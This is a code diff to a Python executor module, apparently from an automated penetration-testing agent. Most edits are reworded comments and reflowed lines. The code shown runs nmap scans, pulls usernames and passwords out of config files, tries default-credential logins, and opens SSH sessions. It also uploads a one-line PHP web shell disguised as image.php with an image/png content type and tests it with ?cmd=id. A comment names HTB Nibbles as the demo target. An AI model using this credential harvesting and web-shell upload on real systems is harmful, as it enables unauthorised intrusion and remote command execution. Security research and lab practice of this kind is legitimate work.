@@ -1,9 +1,10 @@
-"""Real subprocess-backed executors.
+"""
+Real subprocess backed executors.
 
-Each handler returns an `ExecutionResult` carrying `raw=<command output>`
-so the eventual report can show *what was actually run*. Unimplemented
+Each handler returns an ExecutionResult carrying raw=<command output>
+so the eventual report can show what was actually run. Unimplemented
 actions return error="not_implemented" so HybridExecutor can fall through
-to the mock implementation while we incrementally fill these in.
+to the mock implementation while we incrementally fill these in
 """
 
 import re
@@ -19,13 +20,12 @@ from core.state import State
 from executors.base import ExecutionResult
 from knowledge import recipe_for, vuln_reqs_met, vulns_for
 
-
 _NMAP_PORT_RE = re.compile(r"^(\d+)/tcp\s+open\s+(\S+)(?:\s+(.+))?$", re.MULTILINE)
 
 
-# credential extraction patterns — intentionally narrow. matches common
-# config-file shapes; misses anything weird, which we want to fail loudly
-# rather than guess.
+# credential extraction patterns are intentionally narrow. matches common
+# config file shapes and misses anything weird, which we want to fail loudly
+# instead of just guessing
 _CRED_PATTERNS = [
     # key=value style:  user=foo / pass=bar  (and password=, username=)
     re.compile(
@@ -42,11 +42,13 @@ _PHP_PASS_RE = re.compile(r"\$pass\s*=\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)
 
 
 def parse_creds_from_body(body: str, default_access: str = "ssh") -> list[dict]:
-    """Pull (username, password) pairs out of a file body.
+    """
+    Pull (username, password) pairs out of a file body
 
-    Tries a few common shapes. Pairs are returned in order of first user found
-    with the first password found — good enough for config files where they
-    appear together.
+    Tries a few common shapes
+    Pairs are returned in order of first user found
+    with the first password found which is good enough for 
+    config files where they appear together
     """
     if not body:
         return []
@@ -79,10 +81,11 @@ def parse_creds_from_body(body: str, default_access: str = "ssh") -> list[dict]:
     return pairs
 
 
-# Small directory-bust wordlist. Kept inline (rather than a separate file)
-# so the executor has zero external data deps for now. Covers generic admin
-# paths plus a few app-specific hints relevant to scenarios we plan to demo
-# (e.g. /nibbleblog/ for HTB Nibbles).
+# Small directory-bust wordlist. Kept inline instead of a separate file
+# ^ subjuect to change... maybe? idk
+# the executor has zero external data deps for now
+# Covers generic admin paths plus a few app-specific hints relevant to scenarios we plan to demo
+# (/nibbleblog/ for HTB Nibbles).
 DEFAULT_HTTP_WORDLIST = [
     "/",
     "/admin",
@@ -151,9 +154,7 @@ class RealExecutor:
         self.http_wordlist = http_wordlist or DEFAULT_HTTP_WORDLIST
         self.http_request_timeout = http_request_timeout
 
-    def execute(
-        self, action: Action, state: State, scenario: dict
-    ) -> ExecutionResult:
+    def execute(self, action: Action, state: State, scenario: dict) -> ExecutionResult:
         handler = getattr(self, f"_do_{action.name}", None)
         if handler is None:
             return ExecutionResult(action, False, error="not_implemented")
@@ -224,9 +225,7 @@ class RealExecutor:
 
         ports, services = parse_nmap_services(proc.stdout)
         if not ports:
-            return ExecutionResult(
-                action, False, error="scan_failed", raw=proc.stdout
-            )
+            return ExecutionResult(action, False, error="scan_failed", raw=proc.stdout)
         return ExecutionResult(
             action,
             True,
@@ -272,7 +271,9 @@ class RealExecutor:
         )
 
     def _do_identify_vuln(self, action, state, scenario):
-        # pure logic — no I/O. matches observed state against the KB.
+        # pure logic
+        # no I/O!
+        # matches observed state against the KB
         host = self._host(scenario, action.target_host)
         if host is None:
             return ExecutionResult(action, False, error="host_unknown")
@@ -329,9 +330,7 @@ class RealExecutor:
         log = f"POST {login_path} -> {resp.status_code} ({len(body)} bytes)"
 
         if not ok:
-            return ExecutionResult(
-                action, False, error="default_creds_failed", raw=log
-            )
+            return ExecutionResult(action, False, error="default_creds_failed", raw=log)
 
         cred = {
             "username": username,
@@ -358,9 +357,7 @@ class RealExecutor:
         if recipe is None or any(k not in recipe for k in needed):
             return ExecutionResult(action, False, error="recipe_missing")
 
-        http_cred = next(
-            (c for c in state.creds_found if c.access == "http"), None
-        )
+        http_cred = next((c for c in state.creds_found if c.access == "http"), None)
         if http_cred is None:
             return ExecutionResult(action, False, error="no_http_creds")
 
@@ -371,11 +368,10 @@ class RealExecutor:
         upload_path = recipe["upload_endpoint"]
         shell_path = recipe["shell_path_after_upload"]
         upload_field = recipe.get("upload_field_name", "file")
-        user_key, pass_key = recipe.get(
-            "login_payload_keys", ("username", "password")
-        )
+        user_key, pass_key = recipe.get("login_payload_keys", ("username", "password"))
 
-        # tiny PHP shell. ?cmd=<command> runs the command and returns stdout.
+        # tiny PHP shell
+        # ?cmd=<command> runs the command and returns stdout
         shell_payload = b"<?php system($_GET['cmd']); ?>"
         log_lines: list[str] = []
 
@@ -391,8 +387,12 @@ class RealExecutor:
             log_lines.append(f"POST {login_path} -> {login_resp.status_code}")
 
             # 2. upload shell
+            # some upload forms (like nibbleblog my_image plugin) need sibling
+            # fields alongside the file or the handler silently no-ops
+            extra_fields = recipe.get("upload_extra_fields", {})
             upload_resp = sess.post(
                 f"{base}{upload_path}",
+                data=extra_fields,
                 files={upload_field: ("image.php", shell_payload, "image/png")},
                 timeout=self.http_request_timeout,
                 allow_redirects=True,
@@ -401,9 +401,7 @@ class RealExecutor:
 
             # 3. verify shell works
             verify_url = f"{base}{shell_path}?cmd=id"
-            verify_resp = sess.get(
-                verify_url, timeout=self.http_request_timeout
-            )
+            verify_resp = sess.get(verify_url, timeout=self.http_request_timeout)
             log_lines.append(
                 f"GET  {shell_path}?cmd=id -> {verify_resp.status_code} "
                 f"({len(verify_resp.text)} bytes)"
@@ -515,7 +513,7 @@ class RealExecutor:
                     allow_agent=False,
                     look_for_keys=False,
                 )
-                # quick sanity check that the session actually works
+                # quick check that the session works
                 _, stdout, _ = client.exec_command("whoami", timeout=5)
                 whoami = stdout.read().decode().strip()
                 client.close()
